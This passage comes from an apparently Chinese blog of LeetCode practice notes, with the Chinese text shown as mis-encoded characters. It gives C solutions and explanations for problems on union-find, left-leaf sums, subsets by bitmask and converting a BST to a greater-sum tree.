class="number">1</span>];</span><br><span class="line">        a_start = find_x(start);</span><br><span class="line">        a_end = find_x(end);</span><br><span class="line">        <span class="keyword">if</span>(parent[end] != end)<span class="comment">//è¯¥æ¡è¾¹çš„å°¾ç»“ç‚¹å·²ç»ä¸å…¶ä»–ç»“ç‚¹ç›¸è¿ï¼ˆå³åŠ ä¸Šè¿™æ¡è¾¹åå…¥åº¦å¤§äº1ï¼‰</span></span><br><span class="line">        &#123;</span><br><span class="line">            conflict = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            parent[end] = start;</span><br><span class="line">            <span class="keyword">if</span>(a_start == a_end)</span><br><span class="line">            &#123;</span><br><span class="line">                circle = i;<span class="comment">//è¯¥æ¡è¾¹ä¸¤ç»“ç‚¹çš„æ ¹ç»“ç‚¹ç›¸åŒï¼Œå¯èƒ½å½¢æˆå›è·¯</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                union_ancestor(start, end);<span class="comment">//å°†ä¸¤æ£µæ ‘åˆå¹¶ä¸ºä¸€æ£µæ ‘ï¼ˆå¹¶æŸ¥é›†ï¼‰</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *ret = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">2</span>);</span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(conflict&lt;<span class="number">0</span>)<span class="comment">//ä¸å­˜åœ¨äº‰è®®è¾¹ï¼Œåªå­˜åœ¨å½¢æˆå›è·¯çš„è¾¹</span></span><br><span class="line">    &#123;</span><br><span class="line">        ret[<span class="number">0</span>] = edges[circle][<span class="number">0</span>];</span><br><span class="line">        ret[<span class="number">1</span>] = edges[circle][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//å­˜åœ¨äº‰è®®è¾¹</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(circle&gt;<span class="number">0</span>)<span class="comment">//åŒæ—¶å­˜åœ¨å›è·¯è¾¹</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = parent[edges[conflict][<span class="number">1</span>]];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = edges[conflict][<span class="number">0</span>];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/IahfqNWwzCoA6GU.png" alt="image.png"></p><h3 id="18-47-å…¨æ’åˆ—-IIï¼ˆä¸­ç­‰ï¼‰"><a href="#18-47-å…¨æ’åˆ—-IIï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="18 - 47. å…¨æ’åˆ— IIï¼ˆä¸­ç­‰ï¼‰"></a>18 - <a href="https://leetcode-cn.com/problems/permutations-ii/">47. å…¨æ’åˆ— IIï¼ˆä¸­ç­‰ï¼‰</a></h3><p>æ˜æ—©èµ·æ¥å†çœ‹ï¼Œå…ˆå’•å’•å’•äº†ï¼ˆ</p><h3 id="19-404-å·¦å¶å­ä¹‹å’Œï¼ˆç®€å•ï¼‰"><a href="#19-404-å·¦å¶å­ä¹‹å’Œï¼ˆç®€å•ï¼‰" class="headerlink" title="19 - 404. å·¦å¶å­ä¹‹å’Œï¼ˆç®€å•ï¼‰"></a>19 - <a href="https://leetcode-cn.com/problems/sum-of-left-leaves/">404. å·¦å¶å­ä¹‹å’Œï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>è®¡ç®—ç»™å®šäºŒå‰æ ‘çš„æ‰€æœ‰å·¦å¶å­ä¹‹å’Œã€‚</p><p>ç¤ºä¾‹ï¼š</p><pre><code>3</code></pre><p>   &#x2F; \<br>  9  20<br>        &#x2F; \<br>      15   7</p><p>åœ¨è¿™ä¸ªäºŒå‰æ ‘ä¸­ï¼Œæœ‰ä¸¤ä¸ªå·¦å¶å­ï¼Œåˆ†åˆ«æ˜¯ 9 å’Œ 15ï¼Œæ‰€ä»¥è¿”å› 24</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/sum-of-left-leaves">https://leetcode-cn.com/problems/sum-of-left-leaves</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h5 id="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"><a href="#è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" class="headerlink" title="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h5><p>ä¸€å±‚ä¸€å±‚åœ°æœä¸‹å»ï¼Œè‹¥å·¦ç»“ç‚¹ä¸ºå¶å­ç»“ç‚¹ï¼ˆæ— å­å¥³ï¼‰åˆ™åŠ ä¸Šå·¦ç»“ç‚¹çš„å€¼ï¼Œå¦åˆ™æœç´¢å­ç»“ç‚¹ï¼Œè‹¥å³ç»“ç‚¹ä¸ä¸ºå­ç»“ç‚¹åˆ™æœç´¢å³ç»“ç‚¹çš„å­èŠ‚ç‚¹</p><p>å¾—ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeaf</span><span class="params">(<span class="keyword">struct</span> TreeNode * root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> !root-&gt;left &amp;&amp; !root-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    ans += root-&gt;left ? (isLeaf(root-&gt;left) ? root-&gt;left-&gt;val : dfs(root-&gt;left)) : <span class="number">0</span>;</span><br><span class="line">    ans += (root-&gt;right!=<span class="literal">NULL</span>&amp;&amp;!isLeaf(root-&gt;right)) ? dfs(root-&gt;right) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? dfs(root) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ©ç”¨ä¸‰ç›®è¿ç®—ç¬¦çš„ä¸€è¡Œæµ</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? (root-&gt;left &amp;&amp; !root-&gt;left-&gt;left &amp;&amp; !root-&gt;left-&gt;right ? root-&gt;left-&gt;val + sumOfLeftLeaves(root-&gt;right) : sumOfLeftLeaves(root-&gt;left)+sumOfLeftLeaves(root-&gt;right)) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/19/aIl9nXHm8vPQ6ZL.png" alt="image.png"></p><h5 id="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰-é˜Ÿåˆ—"><a href="#è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰-é˜Ÿåˆ—" class="headerlink" title="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰+ é˜Ÿåˆ—"></a>è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰+ é˜Ÿåˆ—</h5><p>è¿™ä¸ªè§£æ³•æ˜¯ä»å®˜æ–¹çš„é¢˜è§£ä¸Šçœ‹æ¥çš„</p><p>ä½¿ç”¨é˜Ÿåˆ—æ•°æ®ç»“æ„æ¥å®ç°å¹¿åº¦ä¼˜å…ˆæœç´¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeafNode</span><span class="params">(<span class="keyword">struct</span> TreeNode *node)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> !node-&gt;left &amp;&amp; !node-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(<span class="keyword">struct</span> TreeNode *root)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> **<span class="title">q</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode *) * <span class="number">1001</span>);</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    q[right++] = root;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">node</span> =</span> q[left++];</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeafNode(node-&gt;left)) </span><br><span class="line">            &#123;</span><br><span class="line">                ans += node-&gt;left-&gt;val;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isLeafNode(node-&gt;right)) </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™ä¹ˆåšæœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯éœ€è¦æå‰å¼€è¾Ÿè¾ƒå¤§çš„ç©ºé—´</p><p><img src="https://i.loli.net/2020/09/19/MSdXJub9jvfs6Ge.png" alt="image.png"></p><h3 id="20-78-å­é›†ï¼ˆä¸­ç­‰ï¼‰"><a href="#20-78-å­é›†ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="20 - 78. å­é›†ï¼ˆä¸­ç­‰ï¼‰"></a>20 - <a href="https://leetcode-cn.com/problems/subsets/">78. å­é›†ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ç»„ä¸å«é‡å¤å…ƒç´ çš„æ•´æ•°æ•°ç»„ numsï¼Œè¿”å›è¯¥æ•°ç»„æ‰€æœ‰å¯èƒ½çš„å­é›†ï¼ˆå¹‚é›†ï¼‰ã€‚</p><p>è¯´æ˜ï¼šè§£é›†ä¸èƒ½åŒ…å«é‡å¤çš„å­é›†ã€‚</p><p>ç¤ºä¾‹:</p><blockquote><p>è¾“å…¥: nums &#x3D; [1,2,3]<br>è¾“å‡º:<br>[<br>  [3],<br>  [1],<br>  [2],<br>  [1,2,3],<br>  [1,3],<br>  [2,3],<br>  [1,2],<br>  []<br>]</p></blockquote><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/subsets">https://leetcode-cn.com/problems/subsets</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>æœ¬é¢˜è¦æ±‚æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ æ‰€ç»„æˆçš„é›†åˆçš„æ‰€æœ‰å­é›†ï¼ˆåŒ…æ‹¬ç©ºé›†ï¼‰</p><h4 id="è§£æ³•ï¼šè¿­ä»£æ³•éå†æ•°ç»„"><a href="#è§£æ³•ï¼šè¿­ä»£æ³•éå†æ•°ç»„" class="headerlink" title="è§£æ³•ï¼šè¿­ä»£æ³•éå†æ•°ç»„"></a>è§£æ³•ï¼šè¿­ä»£æ³•éå†æ•°ç»„</h4><p>è€ƒè™‘åˆ°äºŒè¿›åˆ¶æ•°çš„ç‰¹æ®Šæ€§è´¨ï¼ˆ000â†’001â†’010â†’011â†’100â†’101â†’110â†’111ï¼‰ï¼Œæˆ‘ä»¬ä½¿ç”¨äºŒè¿›åˆ¶æ•°çš„æ¯ä¸€ä½æ¥è¡¨ç¤ºæ˜¯å¦é€‰å–æ•°ç»„ä¸­çš„è¯¥ä½æ•°å¯ä»¥å¾ˆæ–¹ä¾¿åœ°éå†å®Œæ‰€æœ‰é€‰å–çš„æƒ…å†µ</p><p>å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://i.loli.net/2020/09/21/46tKB3T1NSufJcR.png" alt="image.png"></p><p>åŒæ—¶ç”±äºŒé¡¹å¼å®šç†å¯çŸ¥ä¸€å…±æœ‰<strong>2^n</strong>ç§æƒ…å†µï¼ˆx&#x3D;1ï¼‰</p><p><img src="https://i.loli.net/2020/09/21/WjVik4QFfobyUmM.png" alt="image.png"></p><p>æ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>** <span class="title function_">subsets</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> amount = (<span class="number">1</span> &lt;&lt; numsSize);</span><br><span class="line">    <span class="type">int</span> **retn = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*amount);</span><br><span class="line">    *returnSize = amount;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*amount);</span><br><span class="line">    <span class="type">int</span> <span class="built_in">set</span>[numsSize];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;amount;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &amp; (<span class="number">1</span> &lt;&lt; j))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set</span>[n++] = nums[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> *temp = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*n);</span><br><span class="line">        <span class="built_in">memcpy</span>(temp,<span class="built_in">set</span>,<span class="keyword">sizeof</span>(<span class="type">int</span>)*n);</span><br><span class="line">        (*returnColumnSizes)[i] = n;<span class="comment">//è¸©å‘ç‚¹</span></span><br><span class="line">        retn[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯äºŒçº§æŒ‡é’ˆçš„æ¦‚å¿µå’Œä½¿ç”¨æ–¹æ³•</p><p><del>ä»¥åŠæˆ‘æƒ³ä¸é€šä¸ºä»€ä¹ˆreturnColumnSizesè¦ç”¨äºŒçº§æŒ‡é’ˆ</del></p><p><img src="https://i.loli.net/2020/09/21/pKmsDOZvUP9BgHT.png" alt="image.png"></p><h3 id="21-538-æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘ï¼ˆç®€å•ï¼‰"><a href="#21-538-æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘ï¼ˆç®€å•ï¼‰" class="headerlink" title="21 - 538. æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘ï¼ˆç®€å•ï¼‰"></a>21 - <a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/">538. æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘ï¼ˆBinary Search Treeï¼‰ï¼ŒæŠŠå®ƒè½¬æ¢æˆä¸ºç´¯åŠ æ ‘ï¼ˆGreater Tree)ï¼Œä½¿å¾—æ¯ä¸ªèŠ‚ç‚¹çš„å€¼æ˜¯åŸæ¥çš„èŠ‚ç‚¹å€¼åŠ ä¸Šæ‰€æœ‰å¤§äºå®ƒçš„èŠ‚ç‚¹å€¼ä¹‹å’Œã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>è¾“å…¥: åŸå§‹äºŒå‰æœç´¢æ ‘:<br>              5<br>            &#x2F;   <br>           2     13</p><p>è¾“å‡º: è½¬æ¢ä¸ºç´¯åŠ æ ‘:<br>             18<br>            &#x2F;   <br>          20     13</p><p>æ³¨æ„ï¼šæœ¬é¢˜å’Œ 1038: <a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/">https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/</a> ç›¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree">https://leetcode-cn.com/problems/convert-bst-to-greater-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p><strong>äºŒå‰æœç´¢æ ‘</strong>æœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯<strong>ç»“ç‚¹å·¦å­æ ‘çš„ç»“ç‚¹éƒ½æ¯”è¯¥ç»“ç‚¹å°ï¼Œå³å­æ ‘çš„ç»“ç‚¹éƒ½æ¯”è¯¥ç»“ç‚¹å¤§</strong>ï¼Œå› è€Œå«äºŒå‰æœç´¢æ ‘ï¼Œå¯ä»¥ç”¨ä»¥å¤§å¹…ç¼©çŸ­æœç´¢çš„æ—¶é—´</p><h4 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ååºä¸­åºéå†"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ååºä¸­åºéå†" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ååºä¸­åºéå†"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ååºä¸­åºéå†</h4><p>ç”±äºäºŒå‰æŸ¥æ‰¾æ ‘çš„è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬è€ƒè™‘<strong>é€’å½’å®ç°çš„æ·±åº¦ä¼˜å…ˆæœç´¢</strong>ç®—æ³•ï¼Œé€šè¿‡<strong>ååºä¸­åºéå†</strong>æ¥å®ç°ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li><strong>éå†å³å­æ ‘ï¼Œå°†å³å­æ ‘ç»“ç‚¹å€¼åŠ åˆ°summary</strong></li><li><strong>å°†å½“å‰ç»“ç‚¹å€¼åŠ åˆ°summary</strong></li><li><strong>å°†å½“å‰ç»“ç‚¹å€¼ç½®ä¸ºsummary</strong></li><li><strong>éå†å·¦å­æ ‘</strong></li></ul><p>æ¯ä¸ªç»“ç‚¹éœ€è¦ä¸€ä¸ªé¢å¤–çš„æ ˆç©ºé—´ï¼Œå› è€Œç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)ï¼›éœ€è¦éå†æ¯ä¸ªç»“ç‚¹ä¸€æ¬¡ï¼Œå› è€Œæ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> *sum)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;right,sum);</span><br><span class="line">    *sum+=root-&gt;val;</span><br><span class="line">    root-&gt;val=*sum;</span><br><span class="line">    dfs(root-&gt;left,sum);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">convertBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    dfs(root, &amp;sum);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/hJQADZUcMlypLYn.png" alt="image.png"></p><h3 id="22-968-ç›‘æ§äºŒå‰æ ‘ï¼ˆå›°éš¾ï¼‰"><a href="#22-968-ç›‘æ§äºŒå‰æ ‘ï¼ˆå›°éš¾ï¼‰" class="headerlink" title="22 - 968. ç›‘æ§äºŒå‰æ ‘ï¼ˆå›°éš¾ï¼‰"></a>22 - <a href="https://leetcode-cn.com/problems/binary-tree-cameras/">968. ç›‘æ§äºŒå‰æ ‘ï¼ˆå›°éš¾ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæˆ‘ä»¬åœ¨æ 